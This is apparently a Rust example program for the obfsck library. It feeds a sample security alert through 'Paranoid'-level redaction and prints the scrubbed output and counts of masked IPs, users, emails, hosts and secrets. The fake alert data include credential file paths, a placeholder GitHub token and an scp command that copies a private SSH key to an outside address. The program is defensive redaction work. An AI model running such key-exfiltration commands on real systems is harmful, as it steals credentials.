use obfsck::{ObfuscationLevel, obfuscate_alert};
use std::collections::HashMap;

fn main() {
    let output = Some(
        [
            "incident=AUTH-48291 severity=high",
            "actor=bob src=203.0.113.9 dst=10.0.4.19",
            "email=bob@corp.example host=auth.corp.example",
            "path=/home/bob/.aws/credentials",
            "token=ghp_abcdefghijklmnopqrstuvwxyz1234567890",
        ]
        .join(" | "),
    );

    let mut fields = HashMap::new();
    fields.insert("actor".to_string(), "bob".to_string());
    fields.insert("contact".to_string(), "bob@corp.example".to_string());
    fields.insert("host".to_string(), "auth.corp.example".to_string());
    fields.insert("src_ip".to_string(), "203.0.113.9".to_string());
    fields.insert("dst_ip".to_string(), "10.0.4.19".to_string());
    fields.insert("workstation".to_string(), "ws-44.corp.example".to_string());
    fields.insert("jump_host".to_string(), "bastion.corp.example".to_string());
    fields.insert("file_path".to_string(), "/home/bob/keys/id_rsa".to_string());
    fields.insert(
        "command".to_string(),
        "scp /home/bob/keys/id_rsa backup@198.51.100.19:/tmp/".to_string(),
    );
    fields.insert(
        "notes".to_string(),
        "triggered by bob@corp.example from api.prod.example".to_string(),
    );

    let (obf_output, obf_fields, map) =
        obfuscate_alert(output.as_deref(), Some(&fields), ObfuscationLevel::Paranoid);

    println!("Obfuscated output: {:?}", obf_output);
    println!(
        "Obfuscated fields keys: {:?}",
        obf_fields
            .as_ref()
            .map(|f| f.keys().cloned().collect::<Vec<_>>())
            .unwrap_or_default()
    );
    println!(
        "Token counts => ips: {}, users: {}, emails: {}, hosts: {}, containers: {}, secrets: {}",
        map.ips.len(),
        map.users.len(),
        map.emails.len(),
        map.hostnames.len(),
        map.containers.len(),
        map.secrets_count
    );
}
